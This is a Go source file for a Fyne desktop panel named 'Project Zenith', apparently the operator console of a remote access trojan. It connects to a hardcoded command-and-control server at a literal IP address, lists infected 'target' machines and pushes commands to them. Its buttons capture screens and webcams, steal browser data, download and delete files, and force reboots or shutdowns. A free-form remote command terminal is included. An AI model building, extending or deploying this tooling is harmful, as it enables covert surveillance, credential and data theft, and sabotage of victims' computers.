package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"image/color"
	"net/http"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
)

// --- CONFIGURATION ---
const (
	ServerURL = "http://45.76.76.74:43445"
	AdminPass = "MY_ADMIN_PASSWORD"
	PanelPass = "0611"
)

type Agent struct {
	CID      string `json:"cid"`
	Name     string `json:"name"`
	IP       string `json:"ip"`
	Status   string `json:"status"`
	Result   string `json:"result"`
	LastSeen int64  `json:"last_seen"`
}

var (
	selectedCID string
	myApp       fyne.App
	terminal    *widget.Entry
	clientList  *fyne.Container // Исправлено: используем правильный тип контейнера
)

// --- HACKER MATERIAL THEME ---
type zenithTheme struct{}

func (m zenithTheme) Color(n fyne.ThemeColorName, v fyne.ThemeVariant) color.Color {
	switch n {
	case theme.ColorNamePrimary:
		return color.RGBA{R: 0, G: 255, B: 157, A: 255} // Neon Green
	case theme.ColorNameBackground:
		return color.RGBA{R: 5, G: 5, B: 8, A: 255} // Deep Void Black
	case theme.ColorNameInputBackground:
		return color.RGBA{R: 20, G: 20, B: 30, A: 255}
	case theme.ColorNameButton:
		return color.RGBA{R: 30, G: 30, B: 45, A: 255}
	}
	return theme.DefaultTheme().Color(n, v)
}

func (m zenithTheme) Font(s fyne.TextStyle) fyne.Resource     { return theme.DefaultTheme().Font(s) }
func (m zenithTheme) Icon(n fyne.ThemeIconName) fyne.Resource { return theme.DefaultTheme().Icon(n) }
func (m zenithTheme) Size(n fyne.ThemeSizeName) float32       { return theme.DefaultTheme().Size(n) }

func main() {
	myApp = app.NewWithID("com.zenith.admin")
	myApp.Settings().SetTheme(&zenithTheme{})
	showLogin()
	myApp.Run()
}

func showLogin() {
	loginWin := myApp.NewWindow("SYSTEM AUTHENTICATION")
	loginWin.Resize(fyne.NewSize(400, 250))
	loginWin.CenterOnScreen()

	title := canvas.NewText("PROJECT ZENITH", color.RGBA{0, 255, 157, 255})
	title.TextSize = 24
	title.TextStyle = fyne.TextStyle{Bold: true}

	passEntry := widget.NewPasswordEntry()
	passEntry.SetPlaceHolder("ENTER ACCESS CODE...")

	loginBtn := widget.NewButton("INITIALIZE ACCESS", func() {
		if passEntry.Text == PanelPass {
			loginWin.Close()
			showMain()
		} else {
			passEntry.SetText("")
			passEntry.SetPlaceHolder("ACCESS DENIED")
		}
	})

	loginWin.SetContent(container.NewVBox(
		container.NewCenter(title),
		widget.NewSeparator(),
		container.NewPadded(passEntry), // Исправлено: заменено widget.NewPadded на container.NewPadded
		container.NewPadded(loginBtn),
		container.NewCenter(canvas.NewText("by @ill_hack_you", color.RGBA{100, 100, 100, 255})),
	))
	loginWin.Show()
}

func showMain() {
	mainWindow := myApp.NewWindow("Project Zenith by @ill_hack_you")
	mainWindow.Resize(fyne.NewSize(1250, 800))

	// 1. LEFT PANEL: Target List
	clientList = container.NewVBox(widget.NewLabelWithStyle("ONLINE NODES", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}))
	leftScroll := container.NewVScroll(clientList)

	// 2. CENTER PANEL: Cyber Terminal
	terminal = widget.NewMultiLineEntry()
	terminal.TextStyle = fyne.TextStyle{Monospace: true}
	terminal.Disable()
	terminal.SetText("[*] ZENITH CORE LOADED...\n[*] WAITING FOR TARGET SELECTION...\n")

	inputEntry := widget.NewEntry()
	inputEntry.SetPlaceHolder("ROOT@ZENITH:~# execute command...")

	sendBtn := widget.NewButtonWithIcon("EXE", theme.ConfirmIcon(), func() {
		sendCommand(inputEntry.Text)
		inputEntry.SetText("")
	})

	centerLayout := container.NewBorder(
		nil,
		container.NewBorder(nil, nil, nil, sendBtn, inputEntry),
		nil, nil,
		terminal,
	)

	// 3. RIGHT PANEL: Quick Modules
	pathEntry := widget.NewEntry()
	pathEntry.SetPlaceHolder("Enter Path / URL / PID...")

	createModBtn := func(text string, cmd string) *widget.Button {
		return widget.NewButton(text, func() { sendCommand(cmd) })
	}

	rightPanel := container.NewVScroll(container.NewVBox(
		widget.NewLabelWithStyle("MODULES", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
		createModBtn("CAPTURE SCREEN", "screenshot"),
		createModBtn("WEBCAM SNAPSHOT", "webcam"),
		widget.NewSeparator(),
		widget.NewLabel("SYSTEM"),
		createModBtn("FORCE REBOOT", "shutdown /r /t 0"),
		createModBtn("TERMINATE OS", "shutdown /s /t 0"),
		createModBtn("KILL CURRENT WINDOW", "powershell (New-Object -ComObject WScript.Shell).SendKeys('%{F4}')"),
		widget.NewSeparator(),
		widget.NewLabel("FS / DATA"),
		widget.NewButton("LIST DIRECTORY", func() { sendCommand("ls " + pathEntry.Text) }),
		widget.NewButton("DOWNLOAD FILE", func() { sendCommand("download " + pathEntry.Text) }),
		widget.NewButton("DELETE FILE", func() { sendCommand("rmfile " + pathEntry.Text) }),
		widget.NewButton("OPEN URL", func() { sendCommand("start " + pathEntry.Text) }),
		widget.NewButton("SET WALLPAPER", func() { sendCommand("wallpaper " + pathEntry.Text) }),
		widget.NewSeparator(),
		widget.NewLabel("INTEL"),
		createModBtn("BROWSER DATA", "browser_data"),
		createModBtn("SYSTEM INFO", "systeminfo"),
		widget.NewSeparator(),
		widget.NewLabel("ARGUMENTS:"),
		pathEntry,
	))

	// Layout Assembly
	splitLeft := container.NewHSplit(leftScroll, centerLayout)
	splitLeft.Offset = 0.25

	finalSplit := container.NewHSplit(splitLeft, rightPanel)
	finalSplit.Offset = 0.8

	mainWindow.SetContent(finalSplit)

	go refreshLoop()
	mainWindow.Show()
}

func sendCommand(cmd string) {
	if selectedCID == "" {
		terminal.SetText(terminal.Text + "!!! CRITICAL: NO TARGET SELECTED !!!\n")
		return
	}

	payload, _ := json.Marshal(map[string]string{
		"cid": selectedCID,
		"cmd": cmd,
	})

	req, _ := http.NewRequest("POST", ServerURL+"/admin/push", bytes.NewBuffer(payload))
	req.Header.Set("Admin-Auth", AdminPass)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err == nil {
		terminal.SetText(terminal.Text + fmt.Sprintf("[SEND] %s -> %s\n", selectedCID, cmd))
		resp.Body.Close()
	} else {
		terminal.SetText(terminal.Text + "!!! CONNECTION ERROR !!!\n")
	}
}

func refreshLoop() {
	lastResults := make(map[string]string)
	for {
		req, _ := http.NewRequest("GET", ServerURL+"/admin/list", nil)
		req.Header.Set("Admin-Auth", AdminPass)

		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Do(req)
		if err == nil {
			var agents []Agent
			err := json.NewDecoder(resp.Body).Decode(&agents)
			resp.Body.Close()

			if err == nil {
				// Очистка списка
				clientList.Objects = []fyne.CanvasObject{widget.NewLabelWithStyle("ONLINE NODES", fyne.TextAlignCenter, fyne.TextStyle{Bold: true})}

				for _, a := range agents {
					statusText := " [OFFLINE]"
					if a.Status == "online" {
						statusText = " [ACTIVE]"
					}

					cid := a.CID
					btn := widget.NewButton(fmt.Sprintf("%s\n%s\n%s", a.Name, a.IP, statusText), func() {
						selectedCID = cid
						terminal.SetText(terminal.Text + fmt.Sprintf("[*] UPLINK ESTABLISHED: %s\n", cid))
					})

					clientList.Add(btn)

					if cid == selectedCID && a.Result != lastResults[cid] {
						terminal.SetText(terminal.Text + fmt.Sprintf("\n--- INCOMING: %s ---\n%s\n", time.Now().Format("15:04:05"), a.Result))
						lastResults[cid] = a.Result
					}
				}
				clientList.Refresh()
			}
		}
		time.Sleep(1000 * time.Millisecond)
	}
}
